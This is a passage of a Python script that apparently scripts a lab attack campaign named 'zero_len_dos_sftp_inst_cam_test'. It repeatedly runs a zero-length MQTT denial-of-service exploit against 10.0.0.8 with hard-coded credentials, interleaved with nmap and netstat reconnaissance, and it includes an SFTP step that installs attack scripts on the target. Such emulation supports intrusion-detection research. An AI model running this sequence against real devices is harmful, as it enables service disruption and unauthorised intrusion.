            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (PauseStep(10),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(10),), (PauseStep(180),), (PauseStep(10),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=60, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (PauseStep(10),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=120, pause=0), 1
             ), (PauseStep(10),),
            (Nmap10T5RecStep(0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(40),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(30),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(30),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(30),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (NmapSubDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(40),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(30),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(30),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(30),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (NmapSubDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(40),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(30),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(30),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(30),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (NmapSubDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(40),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(30),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(30),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=150, pause=0), 1
             ), (PauseStep(10),),
            (PauseStep(30),), (PauseStep(10),), (NmapBannerDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (NmapSubDiscStep("10.0.0.8", pause=0),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", duration=600, pause=0), 1
             ), (PauseStep(10),),
            (NetstatRecStep(0), 1
             ), (PauseStep(10),), (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
                                   ), (PauseStep(10),),
            (PauseStep(60),), (PauseStep(10),),
            ]
exp_details = []
atk = APTAttack(step_seq, "zero_len_dos_sftp_inst_cam_test", exp_details, "/output/experiment_details.pkl")
atk.run()
atk.save_in()
